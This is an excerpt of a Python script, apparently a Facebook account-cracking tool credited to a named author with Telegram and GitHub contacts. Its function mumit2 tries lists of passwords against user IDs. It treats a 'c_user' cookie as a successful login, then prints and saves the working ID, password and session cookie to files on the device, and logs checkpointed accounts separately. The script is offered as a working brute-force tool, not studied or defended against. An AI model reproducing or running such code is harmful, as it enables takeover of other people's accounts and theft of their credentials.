...
#CREATE BY : MAHFUZ AHMED MIRAZ

#TELEGRAM : +880768588978

#GITHUB : https://github.com/MIRAZ-6T9
...
def fuck():
    ...
    print(' [+] OK Ids saved in MIRAZ/OK.txt')

    print(' [+] CP Ids saved in MIRAZ/CP.txt')
...
def mumit2(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[MIRAZ★XD]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[1;92m[MIRAZ-OK] {uid}|{ps} \nCookie : {coki}")

                open('/sdcard/MIRAZ/OK.txt', 'a').write( uid+' | '+ps+'\n')
                ...
                print(f"\033[1;94m[MIRAZ-CP] {cid}|{ps}")

                open('/sdcard/MIRAZ-CP.txt', 'a').write( uid+' | '+ps+' \n')
